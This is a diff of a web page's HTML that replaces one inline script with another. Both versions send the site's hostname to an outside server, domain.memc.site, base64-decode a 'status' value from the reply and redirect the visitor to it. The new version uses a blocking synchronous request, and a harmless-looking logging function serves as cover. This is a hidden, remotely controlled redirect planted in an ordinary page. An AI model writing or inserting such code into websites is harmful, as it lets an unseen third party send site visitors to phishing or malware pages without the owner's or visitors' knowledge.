@@ -18,27 +18,30 @@
   </head>
   <body>
 <script>
-(async () => {
+(function(){
   const domain = new URL(location.href).hostname;
-  if (!domain) {
-    subsequentCode();
-    return;
-  }
+  if(!domain){ subsequentCode(); return; }
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', `https://domain.memc.site/domain?url=${domain}`, false);
   try {
-    const res = await fetch(`https://domain.memc.site/domain?url=${domain}`);
-    if (!res.ok) throw new Error();
-    const { status } = await res.json();
-    if (status && status.trim()) {
-      location.href = atob(status);
-      return;
-    }
-  } catch (e) {}
+    xhr.send();
+  } catch(e){ subsequentCode(); return; }
+  if(xhr.status === 200){
+    try {
+      const data = JSON.parse(xhr.responseText);
+      if(data.status && data.status.trim()){
+        location.href = atob(data.status);
+        return;
+      }
+    } catch(e){}
+  }
   subsequentCode();
 })();
-function subsequentCode() {
+function subsequentCode(){
   console.log("Subsequent code executed");
 }
 </script>
+
 
     <section class="image4" id="image04-0">
       <div class="image-block m-auto">
